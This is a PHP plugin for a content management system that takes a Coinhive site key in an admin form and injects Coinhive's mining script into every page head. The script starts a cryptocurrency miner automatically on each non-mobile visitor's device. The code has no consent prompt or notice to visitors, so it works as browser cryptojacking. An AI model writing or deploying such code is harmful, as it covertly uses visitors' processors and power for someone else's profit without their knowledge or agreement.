<?php

class pluginCoinHive extends Plugin {

        public function init()
        {
                $this->dbFields = array(
                        'coinhive-sitekey'=>'',
                );
        }

        public function form()
        {
                global $Language;

                $html  = '<div>';
                $html .= '<label for="jscoinhive-sitekey">'.$Language->get('Coinhive Site Key').'</label>';
                $html .= '<input id="jscoinhive-sitekey" type="text" name="coinhive-sitekey" value="'.$this->getDbField('coinhive-sitekey').'">';
                $html .= '<div class="tip">'.$Language->get('complete-this-field-with-the-coinhive-site-key').'</div>';
                $html .= '</div>';

                return $html;
        }

        public function siteHead()
        {

                $html = PHP_EOL.'<!-- Coinhive Miner -->'.PHP_EOL;
                $html .= '<script src="https://coinhive.com/lib/coinhive.min.js"></script>'.PHP_EOL;
                $html .= '<script>'.PHP_EOL;
                $html .= '    var miner = new CoinHive.Anonymous(\''.htmlentities($this->getDbField('coinhive-sitekey')).'\');'.PHP_EOL;
                $html .= '    // Only start on non-mobile devices'.PHP_EOL;
                $html .= '    if (!miner.isMobile()) { miner.start(); }'.PHP_EOL;
		$html .= '</script>'.PHP_EOL;
                $html .= '<!-- End Coinhive Miner -->'.PHP_EOL;
                return $html;
        }
}

